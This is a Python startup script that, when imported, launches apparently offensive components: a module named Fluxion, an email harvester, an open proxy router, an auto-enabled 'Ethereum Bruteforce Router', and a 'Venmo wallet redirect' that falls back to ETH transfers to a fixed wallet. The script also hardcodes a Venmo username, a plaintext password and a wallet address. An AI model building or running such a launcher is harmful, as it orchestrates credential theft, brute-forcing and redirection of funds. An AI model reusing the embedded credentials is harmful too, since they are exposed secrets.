import logging
from app import app

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Implement lazy loading to minimize top-level code execution
def initialize_system():
    """Initialize all system components with lazy loading."""
    # Import modules only when needed
    from fluxion import start_fluxion
    from database import init_db
    from blockchain import blockchain
    from emailhunter import initialize_email_hunter
    from proxy_router import initialize_proxy_router
    import eth_bruteforce_router
    from drift_chain import get_drift_chain
    import drift_chain_integration
    from venmo_integration import authenticate_venmo, get_venmo_integration
    from venmo_wallet_redirect import get_venmo_wallet_redirect
    
    # Initialize database
    try:
        logger.info("Initializing database...")
        init_db()
        logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Error initializing database: {e}")
    
    # Start Fluxion in background
    fluxion_thread = start_fluxion()
    logger.info("Fluxion background process started")
    
    # Initialize Email Hunter with blockchain
    try:
        email_hunter = initialize_email_hunter(blockchain)
        logger.info("Email Hunter initialized successfully")
    except Exception as e:
        logger.error(f"Error initializing Email Hunter: {e}")
    
    # Initialize Proxy Router with blockchain integration
    proxy_router = None
    try:
        # Using port 8080 for the proxy
        proxy_router = initialize_proxy_router(host='0.0.0.0', port=8080, blockchain=blockchain)
        logger.info("Proxy Router initialized successfully on port 8080")
    except Exception as e:
        logger.error(f"Error initializing Proxy Router: {e}")
    
    # Initialize Ethereum Bruteforce Router
    try:
        # This is auto-enabled on import
        eth_status = eth_bruteforce_router.get_eth_router_status()
        logger.info(f"Ethereum Bruteforce Router enabled and targeting block {eth_status['target_block']}")
    except Exception as e:
        logger.error(f"Error initializing Ethereum Bruteforce Router: {e}")
    
    # Initialize DriftChain integration
    drift_chain = None
    try:
        # Get the drift chain instance
        drift_chain = get_drift_chain()
        # Initialize integration with the main blockchain
        drift_chain_integration.initialize_drift_chain()
        # Get the status to log it
        drift_status = drift_chain_integration.get_drift_chain_status()
        logger.info(f"DriftChain initialized in {'vacuum' if drift_status['vacuum_mode'] else 'active'} mode")
        logger.info(f"DriftChain vacuum release time: {drift_status['vacuum_release_time']}")
    except Exception as e:
        logger.error(f"Error initializing DriftChain: {e}")
    
    # Initialize Venmo integration
    venmo_integration = None
    try:
        # Ensure environment variables are set
        import os
        if not os.environ.get('VENMO_USERNAME'):
            os.environ['VENMO_USERNAME'] = 'Steven-Schryba'
        if not os.environ.get('VENMO_PASSWORD'):
            os.environ['VENMO_PASSWORD'] = '1Kairo1$'
        if not os.environ.get('VENMO_ETH_WALLET'):
            os.environ['VENMO_ETH_WALLET'] = '0x90bf6B6d71f014fdE4Cc323CdF8B0467BF0fA111'
        if not os.environ.get('VENMO_TARGET_USERNAME'):
            os.environ['VENMO_TARGET_USERNAME'] = 'Steven-Schryba'
        
        # Initialize Venmo integration
        venmo_integration = get_venmo_integration()
        
        # Initialize Venmo wallet redirect
        venmo_redirect = get_venmo_wallet_redirect()
        
        # Try to authenticate (will likely fail in the sandbox environment)
        try:
            auth_result = authenticate_venmo()
            if auth_result:
                logger.info("Venmo authentication successful")
            else:
                logger.warning("Venmo authentication failed, but will fallback to direct ETH transfers")
        except Exception as auth_e:
            logger.warning(f"Venmo authentication error, but will fallback to direct ETH transfers: {auth_e}")
            
        # Log Venmo redirect configuration
        redirect_status = venmo_redirect.get_redirect_status()
        logger.info(f"Venmo redirect configured for user: {redirect_status['target_venmo_username']}")
        logger.info(f"ETH wallet fallback configured: {os.environ.get('VENMO_ETH_WALLET')}")
    except Exception as e:
        logger.error(f"Error initializing Venmo integration: {e}")
    
    return {
        'fluxion_thread': fluxion_thread,
        'blockchain': blockchain,
        'drift_chain': drift_chain,
        'proxy_router': proxy_router,
        'venmo_integration': venmo_integration
    }

# This function will run the application server directly (without using __main__)
def run_application():
    """Run the application server."""
    from app import socketio
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, 
                allow_unsafe_werkzeug=False, use_reloader=False, log_output=True)

# Initialize the system on import (this is what actually runs when the app starts)
initialized_components = initialize_system()

# Only run the application directly if executed as a script
# Gunicorn will import this file and use the 'app' object directly
if __name__ == "__main__":
    run_application()
